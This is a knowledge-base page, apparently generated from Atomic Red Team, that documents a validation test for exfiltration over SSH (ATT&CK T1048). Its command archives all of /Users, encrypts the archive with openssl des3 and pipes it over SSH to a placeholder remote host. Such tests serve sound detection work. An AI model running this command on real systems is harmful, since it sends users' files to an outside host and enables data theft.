---
atomic_guid: "7c3cb337-35ae-4d06-bf03-3032ed2ec268"
title: "Exfiltration Over Alternative Protocol - SSH"
framework: "atomic"
generated: "true"
attack_technique_id: "T1048"
attack_technique_name: "Exfiltration Over Alternative Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048/T1048.yaml"
build_date: "2026-04-26 17:02:12"
executor: "sh"
aliases:
  - "7c3cb337-35ae-4d06-bf03-3032ed2ec268"
  - "Exfiltration Over Alternative Protocol - SSH"
platforms:
  - "macos"
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Exfiltration Over Alternative Protocol - SSH

Input a domain and test Exfiltration over SSH

Local to Remote

Upon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.

## Metadata

- Atomic GUID: 7c3cb337-35ae-4d06-bf03-3032ed2ec268
- Technique: T1048: Exfiltration Over Alternative Protocol
- Platforms: macos, linux
- Executor: sh
- Source Path: atomics/T1048/T1048.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048]]

## Input Arguments

### domain

- description: target SSH domain
- type: url
- default: target.example.com

### password

- description: password for user
- type: string
- default: atomic

### user_name

- description: username for domain
- type: string
- default: atomic

## Executor

- name: sh

### Command

```bash
tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048/T1048.yaml)
